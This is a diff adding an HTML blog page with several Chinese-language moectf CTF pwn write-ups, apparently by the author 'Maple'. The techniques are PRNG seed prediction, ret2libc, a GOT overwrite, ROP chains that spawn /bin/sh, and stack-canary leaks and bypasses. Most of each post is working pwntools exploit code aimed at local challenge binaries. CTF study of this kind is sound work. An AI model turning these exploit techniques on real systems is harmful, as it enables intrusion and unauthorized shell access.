+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2025-02-24 09:24:09" itemprop="dateModified" datetime="2025-02-24T09:24:09+08:00">2025-02-24</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="moectf-这是什么？random"><a href="#moectf-这是什么？random" class="headerlink" title="moectf 这是什么？random"></a>moectf 这是什么？random</h1><p>by Maple</p>
+<p><em><strong>伪随机数</strong></em></p>
+<p>生成随机数的种子为一年中当前天数-1.所以直接照抄源码里生成随机数的逻辑</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> localtime</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = <span class="string">&#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;</span>.split()</span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">50656</span>)</span><br><span class="line"></span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">&quot;libc.so.6&quot;</span>)</span><br><span class="line">libc.srandom(localtime().tm_yday - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;\n&#x27;</span>,<span class="built_in">str</span>(libc.random()%<span class="number">90000</span>+<span class="number">10000</span>).encode())</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://maple-pwn.github.io/2025/04/04/moectf/prelibc/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Maple">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Maple">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | Maple">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2025/04/04/moectf/prelibc/" class="post-title-link" itemprop="url">未命名</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2025-04-04 01:34:37" itemprop="dateCreated datePublished" datetime="2025-04-04T01:34:37+08:00">2025-04-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2025-02-18 17:33:42" itemprop="dateModified" datetime="2025-02-18T17:33:42+08:00">2025-02-18</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="moectf-这是什么？libc"><a href="#moectf-这是什么？libc" class="headerlink" title="moectf 这是什么？libc!"></a>moectf 这是什么？libc!</h1><p>by Maple</p>
+<p><em><strong>ret2libc</strong></em></p>
+<p>直接泄露给我们了puts的地址，还有libc在附件里，直接用就行</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">❯ checksec pwn</span><br><span class="line">[*] &#x27;/home/pwn/pwn/moectf/prelibc/pwn&#x27;</span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        PIE enabled</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure>
+
+<p>开启了NX和PIE，确实libc好做</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">58265</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&quot;0x&quot;</span>)</span><br><span class="line">libc.address = <span class="built_in">int</span>(io.recv(<span class="number">12</span>), <span class="number">16</span>) - libc.sym[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">9</span>) + flat([</span><br><span class="line">        libc.search(asm(<span class="string">&quot;pop rdi; ret;&quot;</span>)).__next__() + <span class="number">1</span>, <span class="comment"># 即 `ret`，用于栈指针对齐</span></span><br><span class="line">        libc.search(asm(<span class="string">&quot;pop rdi; ret;&quot;</span>)).__next__(),</span><br><span class="line">        libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>).__next__(),</span><br><span class="line">        libc.sym[<span class="string">&quot;system&quot;</span>],</span><br><span class="line">])</span><br><span class="line">io.sendafter(<span class="string">b&quot;&gt;&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><em>直接用的官方wp</em></p>
+<p>这里解释一点，<code>libc.search(asm(&quot;pop rdi; ret;&quot;)).__next__() + 1</code>这里，本身libc搜到了<code>pop rdi； ret;</code>的地址，就返回为首地址，也就是<code>pop rdi</code>处，再加1就到了ret处，通过ret操作补全一下没对齐的栈</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://maple-pwn.github.io/2025/04/04/moectf/pregot/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Maple">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Maple">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | Maple">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2025/04/04/moectf/pregot/" class="post-title-link" itemprop="url">未命名</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2025-04-04 01:34:37" itemprop="dateCreated datePublished" datetime="2025-04-04T01:34:37+08:00">2025-04-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2025-02-17 13:13:53" itemprop="dateModified" datetime="2025-02-17T13:13:53+08:00">2025-02-17</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="moectf-这是什么？GOT！"><a href="#moectf-这是什么？GOT！" class="headerlink" title="moectf 这是什么？GOT！"></a>moectf 这是什么？GOT！</h1><p>by Maple</p>
+<p>这里程序直接读入到GOT表里面，并且保护为<code>Partial RELRO</code>,所以将<code>exit</code>的地址覆盖为<code>ubreachable</code>函数的地址就可以了，记得别覆盖<code>system</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">56063</span>)</span><br><span class="line">sys = <span class="number">0x401056</span></span><br><span class="line">un = <span class="number">0x401196</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">2</span>+p64(sys)+p64(<span class="number">0</span>)*<span class="number">4</span>+p64(un)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<table>
+<thead>
+<tr>
+<th><img src="/./images/image-20250217130722401.png" alt="image-20250217130722401"></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>ida中可以查到<code>system</code>函数的plt表地址，.GOT初始值</td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th><img src="/./images/image-20250217131303322.png" alt="image-20250217131303322"></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>除了system，其它都分别覆盖掉，不需要的直接用0盖掉，exit用后门函数覆盖</td>
+</tr>
+</tbody></table>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://maple-pwn.github.io/2025/04/04/moectf/NX_on/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Maple">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Maple">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | Maple">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2025/04/04/moectf/NX_on/" class="post-title-link" itemprop="url">未命名</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2025-04-04 01:34:37" itemprop="dateCreated datePublished" datetime="2025-04-04T01:34:37+08:00">2025-04-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2025-02-27 17:51:01" itemprop="dateModified" datetime="2025-02-27T17:51:01+08:00">2025-02-27</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="moectf-NX-on"><a href="#moectf-NX-on" class="headerlink" title="moectf NX_on"></a>moectf NX_on</h1><p>by Maple</p>
+<p><em><strong>canary+ROP</strong></em></p>
+<p>存在输入并将输入输出出来的部分，所以可以以此泄露canary,详细看<a href="../basic/Canary.md">这里</a></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+<span class="string">b&#x27;b&#x27;</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;id?&#x27;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(payload)</span><br><span class="line">canary = u64(<span class="string">b&#x27;\x00&#x27;</span>+p.recv(<span class="number">7</span>))</span><br><span class="line">log.info(<span class="string">&quot;canary&quot;</span>+<span class="built_in">hex</span>(canary))</span><br></pre></td></tr></table></figure>
+
+<p>接着是输入<code>buf2</code>，这里构造ROP链（我相信你已经可以看懂ROP链了，如果看不懂，再去写写其它题再来吧），稍后执行这里就行</p>
+<p>接下来有个输入数值的，通过v5输入，然后可以控制<code>j_memcpy()</code>复制的长度</p>
+<p>看到<code>unsigned int</code>就可以立刻想到输入一个负数，但是这里输入<code>-1</code>会出现问题，原因未知（懒狗懒得找了），随便试了试别的负数</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">pop_rax = <span class="number">0x00000000004508b7</span></span><br><span class="line">pop_rdi = <span class="number">0x000000000040239f</span></span><br><span class="line">pop_rsi = <span class="number">0x000000000040a40e</span></span><br><span class="line">pop_rdx_rbx = <span class="number">0x000000000049d12b</span></span><br><span class="line">syscall = <span class="number">0x402154</span></span><br><span class="line">binsh = <span class="number">0x00000000004e3950</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+<span class="string">b&#x27;b&#x27;</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;id?&#x27;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(payload)</span><br><span class="line">canary = u64(<span class="string">b&#x27;\x00&#x27;</span>+p.recv(<span class="number">7</span>))</span><br><span class="line">log.info(<span class="string">&quot;canary&quot;</span>+<span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;B&#x27;</span>*<span class="number">0x18</span>+p64(canary)+<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x8</span></span><br><span class="line">payload2+=p64(pop_rax)+p64(<span class="number">59</span>)</span><br><span class="line">payload2+=p64(pop_rdi)+p64(binsh)</span><br><span class="line">payload2+=p64(pop_rsi)+p64(<span class="number">0</span>)</span><br><span class="line">payload2+=p64(pop_rdx_rbx)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">payload2+=p64(syscall)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;name?\n&#x27;</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;quit\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;-111&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://maple-pwn.github.io/2025/04/04/moectf/mycanary/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Maple">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Maple">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | Maple">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2025/04/04/moectf/mycanary/" class="post-title-link" itemprop="url">未命名</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2025-04-04 01:34:37" itemprop="dateCreated datePublished" datetime="2025-04-04T01:34:37+08:00">2025-04-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2025-02-24 10:59:21" itemprop="dateModified" datetime="2025-02-24T10:59:21+08:00">2025-02-24</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="moectf-catch-the-canary"><a href="#moectf-catch-the-canary" class="headerlink" title="moectf catch_the_canary"></a>moectf catch_the_canary</h1><p>by Maple</p>
+<p><em><strong>Canary绕过的多种方式</strong></em></p>
+<p>这道题使用两&#x2F;三种Canary的绕过方式</p>
+<p>详细请看<a href="../basic/Canary.md">这里</a></p>
+<h2 id="第一次绕过"><a href="#第一次绕过" class="headerlink" title="第一次绕过"></a>第一次绕过</h2><img src="./images/image-20250224102256449.png" alt="image-20250224102256449" style="zoom:80%;" />
+
+<p>第21-24行模拟了32位程序中爆破Canary的方法，</p>
+<p>大道至简，一个个试</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0xabcd00</span>).encode())</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x00ffdcba</span>,<span class="number">0x01000000</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;n.\n&#x27;</span>,<span class="built_in">str</span>(i).encode())</span><br><span class="line">    rec = p.recvuntil(<span class="string">b&#x27;]&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;Error&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> rec:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="第二次绕过"><a href="#第二次绕过" class="headerlink" title="第二次绕过"></a>第二次绕过</h2><img src="./images/image-20250224102948625.png" alt="image-20250224102948625" style="zoom:80%;" />
+
+<p>这里v9的输入存在溢出，可以覆盖v10的值，但是在输入结束后会对v9[0]的值进行检查，那么有什么办法可以绕过输入呢？</p>
+<p>有的，兄弟，有的</p>
+<p>观察scanf函数，发现格式说明符是<code>%zu</code>(读取无符号整数)，解析规则为：</p>
+<ul>
+<li>有效输入：数字0-9和前导空格</li>
+<li>无效输入：包含非数字字符（如+，-，字母等），scanf会停止解析，不会修改目标变量，并返回0</li>
+</ul>
+<p>所以我们可以输入<code>+</code>或<code>-</code>来跳过一次输入（准确来说，scanf输入都可以这样绕过）</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">p.sendlineafter(<span class="string">b&#x27;t.\n&#x27;</span>,<span class="string">b&#x27;+&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0xbacd003</span>).encode())</span><br></pre></td></tr></table></figure>
+
+<h2 id="第三次绕过"><a href="#第三次绕过" class="headerlink" title="第三次绕过"></a>第三次绕过</h2><p>这次就是我们常见的覆盖截断泄露Canary了</p>
+<p>多输入一位字符覆盖<code>\x00</code>，阻止输出截断，然后就可以得到canary的值</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">p.send(<span class="string">b&#x27;b&#x27;</span>*<span class="number">25</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;b&#x27;</span>*<span class="number">25</span>)</span><br><span class="line">canary = <span class="string">b&#x27;\x00&#x27;</span>+p.recv(<span class="number">7</span>)</span><br><span class="line"><span class="built_in">print</span>(canary)</span><br></pre></td></tr></table></figure>
+
+<h2 id="最终实现"><a href="#最终实现" class="headerlink" title="最终实现"></a>最终实现</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = <span class="string">&#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;</span>.split()</span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#------------1--------------</span></span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0xabcd00</span>).encode())</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x00ffdcba</span>,<span class="number">0x01000000</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;n.\n&#x27;</span>,<span class="built_in">str</span>(i).encode())</span><br><span class="line">    rec = p.recvuntil(<span class="string">b&#x27;]&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;Error&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> rec:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#-----------2-------------</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;t.\n&#x27;</span>,<span class="string">b&#x27;+&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0xbacd003</span>).encode())</span><br><span class="line"></span><br><span class="line"><span class="comment">#----------3------------</span></span><br><span class="line">backdoor = <span class="number">0x4012AD</span></span><br><span class="line">p.send(<span class="string">b&#x27;b&#x27;</span>*<span class="number">25</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;b&#x27;</span>*<span class="number">25</span>)</span><br><span class="line">canary = <span class="string">b&#x27;\x00&#x27;</span>+p.recv(<span class="number">7</span>)</span><br><span class="line"><span class="built_in">print</span>(canary)</span><br><span class="line">p.send(<span class="string">b&#x27;b&#x27;</span>*<span class="number">24</span>+canary+<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x8</span>+p64(backdoor))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+  <nav class="pagination">
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" title="下一页" aria-label="下一页" href="/page/2/"><i class="fa fa-angle-right"></i></a>
+  </nav>
 
 </div>
   </main>
